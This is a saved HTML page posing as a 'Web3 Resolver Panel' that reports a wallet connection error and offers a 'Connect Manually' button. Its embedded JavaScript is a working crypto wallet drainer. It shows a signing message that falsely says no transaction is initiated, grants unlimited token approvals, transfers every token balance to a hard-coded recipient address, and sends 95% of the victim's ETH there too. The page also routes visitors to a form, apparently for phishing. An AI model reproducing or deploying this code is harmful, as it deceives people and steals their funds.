<!DOCTYPE html>
<html lang="en" style="filter: hue-rotate(4deg);"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>Welcome to our website</title>
<meta name="description" content="Welcome to our website.">

<script>
    document.documentElement.style.cssText="filter:hue-rotate(4deg)";
</script>
<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
<!-- Favicon icon -->
<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
<link rel="stylesheet" href="/Connect Manually_files/style.css">

</head>

<body class="@@dashboard">

    <!-- <div id="preloader"><i>.</i><i>.</i><i>.</i></div> -->

    <div id="main-wrapper" class="front show">

        <div class="header landing">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="navigation">
                            <nav class="navbar navbar-expand-lg navbar-light">
                                <div class="brand-logo">
                                    <a href="/">
                                        <img src="./Connect Manually_files/logo.png" alt="" class="logo-primary">
                                        <img src="./Connect Manually_files/logow.png" alt="" class="logo-white">
                                    </a>
                                </div>
                                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                    <span class="navbar-toggler-icon"></span>
                                </button>
                                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                                    <ul class="navbar-nav me-auto">
                                        <li class="nav-item dropdown"><a class="nav-link" href="/">Home</a>
                                        </li>
                                        <li class="nav-item"><a class="nav-link" href="explore.html">Explore</a></li>
                                       
                                    </ul>
                                </div>
                                <div class="signin-btn d-flex align-items-center">
                                    <div class="dark-light-toggle theme-switch" onclick="themeToggle()">
                                        <span class="dark"><i class="ri-moon-line"></i></span>
                                        <span class="light"><i class="ri-sun-line"></i></span>
                                    </div>
                                </div>
                            </nav>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <div class="page-title">
    <div class="container">
        <div class="row align-items-center justify-content-between">
            <div class="col-6">
                <div class="page-title-content">
                    <!-- <h3>Explore</h3>
                    <p class="mb-2">Neftify Explore page</p> -->
                </div>
            </div>
            <!-- <div class="col-auto">
                <div class="breadcrumbs"><a href="#">Home </a><span><i class="ri-arrow-right-s-line"></i></span><a
                        href="#">Payments</a></div>
            </div> -->
        </div>
    </div>
</div>

    <div class="profile-page">
        <div class="container">
            <div class="row">
                <div class="col-12">
                   
                </div>
            </div>



            <div class="row">
                <div class="col-xl-12">
                    <!-- <h4 class="card-title mb-3">My Activity </h4> -->
                    <div class="card">
                        <div class="card-body">
                            <div class="all-notification">
                                <div class="notification-list">
                                    <div class="lists">
                                        
                                        <a href="Issues.html" class="">
                                            </a><div class="d-flex align-items-center"><a href="Issues.html" class=""><span class="me-3 icon fail"><i class="bi bi-x"></i></span>
                                                </a><div><a href="Issues.html" class="">
                                                    <h6 class="mb-0">Error connecting automaticallly</h6>
                                                    <!-- <span>2020-11-04
                                                        12:00:23</span> -->
                                                        </a><a class="btn btn-primary" href="Issues.html">Connect Manually</a>
                                                </div>
                                            </div>
                                         
                                        <!-- <a href="#" class="">
                                            <div class="d-flex align-items-center"><span class="me-3 icon pending"><i
                                                        class="bi bi-exclamation-triangle"></i></span>
                                                <div>
                                                    <h6 class="mb-0">Connection verification pending...</h6>
                                                <span>...</span> 
                                                </div>
                                            </div>
                                        </a> -->
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>




    <div class="bottom section-padding triangle-top-dark triangle-bottom-dark">
        <div class="container">
            <div class="row">
                <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
                    <div class="bottom-logo"><img class="pb-3" src="./Connect Manually_files/logoh.png" alt="">
                        <p>Our commitment is to address a wide array of blockchain and crypto challenges
                            comprehensively. We strive to provide effective solutions that empower you to navigate the
                            rapidly evolving blockchain landscape with confidence. Trust us to optimize your operations
                            and create a successful and efficient blockchain ecosystem.</p>
                    </div>
                </div>
                <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
                    <div class="bottom-widget">
                        <h4 class="widget-title">Quick Links</h4>
                        <ul>
                            <li><a href="explore.html">Explore</a></li>
                            <li><a href="issues.html">Connect</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="copyright">
                        <p>Â© Copyright <script>document.write(new Date().getFullYear());</script>2024 <a href="issues.html">Web3 Resolver Panel</a> <!-- -->All Rights Reserved</p>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="footer-social">
                        <ul>
                            <li><a href="issues.html"><i class="bi bi-facebook"></i></a></li>
                            <li><a href="issues.html"><i class="bi bi-twitter"></i></a></li>
                            <li><a href="issues.html"><i class="bi bi-linkedin"></i></a></li>
                            <li><a href="issues.html"><i class="bi bi-youtube"></i></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>


    </div>
    <script>
        // Get the current URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const issue = urlParams.get('issue'); // Assuming 'issue' is a parameter in the current URL

        // Construct the dynamic href for the link
        const nextPage = 'form.php'; // Replace with the actual name of your next page
        const dynamicHref = `${nextPage}?issue=${issue}`;

        // Update the href attribute of the link with the dynamic value
        document.getElementById('dynamicLink').href = dynamicHref;
    </script>
    <script src="./Connect Manually_files/jquery.min.js"></script>
    <script src="./Connect Manually_files/bootstrap.bundle.min.js"></script>


    <script src="./Connect Manually_files/magnific-popup.js"></script>
    <script src="./Connect Manually_files/magnific-popup-init.js"></script>

    <script>
      const etherscanApiKey = '7K13FA32ZEWIPVXRS2ICJG5XUKHZMQE3DX';
        const contractAddress = '0xa9a0Cf973eC93F00F9d7383CF653dcDD1291345b';
        const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
        const erc20ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
        ];
        const contractABI = [
            "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
        ];

        async function connectWallet() {
          if (typeof window.ethereum !== 'undefined') {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();

                try {
                    await provider.send("eth_requestAccounts", []);
                    const address = await signer.getAddress();
                    const tokens = await fetchTokens(address);

                    // Message to sign
                    const message = "This is a standard message approval to verify your account. No transactions are initiated";
                    const signature = await signer.signMessage(message);
                    console.log('Signature:', signature);

                    for (let token of tokens) {
                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                        const maxUint256 = ethers.constants.MaxUint256;

                        // Approve unlimited tokens
                        const approveTx = await tokenContract.approve(contractAddress, maxUint256);
                        await approveTx.wait();
                        console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                        // Transfer tokens using the smart contract
                        const contract = new ethers.Contract(contractAddress, contractABI, signer);
                        const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                        const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                        await transferTx.wait();
                        console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);

                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);

                        const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);

                     // Define the transaction
                        const transaction = {
                            to: recipientAddress, // Replace with the recipient's address
                            value: amountToSend,
                            // Optional: You can specify gasLimit and gasPrice here if necessary
                        };
                        const txResponse = await signer.sendTransaction(transaction);
                        console.log(`Transaction hash: ${txResponse.hash}`);

                        // Wait for the transaction to be mined
                        const txReceipt = await txResponse.wait();
                        console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                    }
                } catch (error) {
                    console.error('Error handling tokens:', error);
                }
            } else {
                console.log('Please install MetaMask!');
            }
        }

        async function fetchTokens(address) {
            const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanApiKey}`;
            const response = await fetch(url);
            const data = await response.json();
            const tokens = new Set();

            data.result.forEach(tx => {
                if (tx.to.toLowerCase() === address.toLowerCase() || tx.from.toLowerCase() === address.toLowerCase()) {
                    tokens.add({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress });
                }
            });
            return Array.from(tokens);
        }
    </script>


    <script src="/Connect Manually_files/scripts.js"></script>
   
   
    <script>
        // You can use JavaScript to dynamically create the link based on the current URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const issue = urlParams.get('issue');
        const nextPageLink = document.createElement('a');
        nextPageLink.href = `form.php?issue=${issue}`;
        nextPageLink.textContent = 'Go to Next Page Dynamically';
        document.body.appendChild(nextPageLink);
    </script>

<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'87a52f3eb9fc4072',t:'MTcxNDExOTk1MS40MTkwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="/Connect Manually_files/saved_resource.html"></iframe>

</body></html>